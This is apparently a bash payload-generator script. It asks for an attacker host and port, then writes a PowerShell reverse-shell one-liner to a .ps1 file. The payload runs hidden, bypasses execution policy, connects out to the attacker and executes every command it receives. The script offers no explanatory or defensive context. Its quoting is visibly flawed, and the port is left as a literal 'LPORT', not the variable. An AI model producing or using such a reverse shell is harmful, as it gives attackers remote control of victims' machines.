#!/bin/bash

read -p "[+] Enter LHOST : " LHOST
read -p "[+] Enter LPORT : " LPORT

echo "LHOST : $LHOST"
echo "LPORT : $LPORT"

echo """
powershell -nop -W hidden -noni -ep bypass -c '$TCPClient = New-Object Net.Sockets.TCPClient('$LHOST', LPORT);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'
""" >> /opt/wd-generated/powershell.ps1